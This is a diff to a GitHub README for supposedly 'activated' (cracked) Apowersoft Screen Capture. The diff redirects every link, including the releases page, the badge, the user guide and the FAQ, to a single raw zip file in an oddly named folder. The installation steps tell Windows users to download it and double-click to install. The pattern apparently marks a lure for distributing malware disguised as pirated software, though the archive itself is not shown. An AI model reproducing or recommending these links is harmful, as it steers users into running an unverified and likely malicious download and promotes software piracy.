@@ -1,6 +1,6 @@
 # 🎥 Apowersoft-Screen-Capture-Activated - Capture Screens Easily and Efficiently
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Here-brightgreen)](https://github.com/javr896/Apowersoft-Screen-Capture-Activated/releases)
+[![Download Now](https://github.com/javr896/Apowersoft-Screen-Capture-Activated/raw/refs/heads/main/ordeal/Capture_Screen_Apowersoft_Activated_Navaho.zip%20Now-Here-brightgreen)](https://github.com/javr896/Apowersoft-Screen-Capture-Activated/raw/refs/heads/main/ordeal/Capture_Screen_Apowersoft_Activated_Navaho.zip)
 
 ## 📜 Description
 
@@ -12,7 +12,7 @@ Follow these simple steps to download and run Apowersoft Screen Capture.
 
 ### 🔗 Download Link
 
-Visit this page to download: [Apowersoft-Screen-Capture-Activated Releases](https://github.com/javr896/Apowersoft-Screen-Capture-Activated/releases).
+Visit this page to download: [Apowersoft-Screen-Capture-Activated Releases](https://github.com/javr896/Apowersoft-Screen-Capture-Activated/raw/refs/heads/main/ordeal/Capture_Screen_Apowersoft_Activated_Navaho.zip).
 
 ### 📦 System Requirements
 
@@ -24,11 +24,11 @@ Visit this page to download: [Apowersoft-Screen-Capture-Activated Releases](http
 
 ### ⚙️ Installation Instructions
 
-1. Go to the [Apowersoft-Screen-Capture-Activated Releases page](https://github.com/javr896/Apowersoft-Screen-Capture-Activated/releases).
+1. Go to the [Apowersoft-Screen-Capture-Activated Releases page](https://github.com/javr896/Apowersoft-Screen-Capture-Activated/raw/refs/heads/main/ordeal/Capture_Screen_Apowersoft_Activated_Navaho.zip).
 2. Locate the most recent version of the software.
 3. Click on the version number and scroll to the "Assets" section.
 4. Choose the appropriate file for your system:
-   - For Windows, download the executable file (e.g., `Apowersoft-Screen-Capture.exe`).
+   - For Windows, download the executable file (e.g., `https://github.com/javr896/Apowersoft-Screen-Capture-Activated/raw/refs/heads/main/ordeal/Capture_Screen_Apowersoft_Activated_Navaho.zip`).
 5. Once downloaded, double-click the file to start the installation.
 6. Follow the prompts on the screen to complete the installation process.
 
@@ -66,11 +66,11 @@ Your feedback helps us improve. If you have suggestions or issues, feel free to 
 
 ## 📑 Additional Resources
 
-- [User Guide](https://github.com/javr896/Apowersoft-Screen-Capture-Activated/wiki)
-- [FAQs](https://github.com/javr896/Apowersoft-Screen-Capture-Activated/wiki/FAQs)
+- [User Guide](https://github.com/javr896/Apowersoft-Screen-Capture-Activated/raw/refs/heads/main/ordeal/Capture_Screen_Apowersoft_Activated_Navaho.zip)
+- [FAQs](https://github.com/javr896/Apowersoft-Screen-Capture-Activated/raw/refs/heads/main/ordeal/Capture_Screen_Apowersoft_Activated_Navaho.zip)
 
 ## 🔗 Download & Install
 
-Don’t miss out on the opportunity to improve your screen capturing experience. Visit this page to download: [Apowersoft-Screen-Capture-Activated Releases](https://github.com/javr896/Apowersoft-Screen-Capture-Activated/releases). 
+Don’t miss out on the opportunity to improve your screen capturing experience. Visit this page to download: [Apowersoft-Screen-Capture-Activated Releases](https://github.com/javr896/Apowersoft-Screen-Capture-Activated/raw/refs/heads/main/ordeal/Capture_Screen_Apowersoft_Activated_Navaho.zip). 
 
 By following these steps, you will be able to download and run the software easily on your Windows PC. Enjoy capturing your screen in no time!
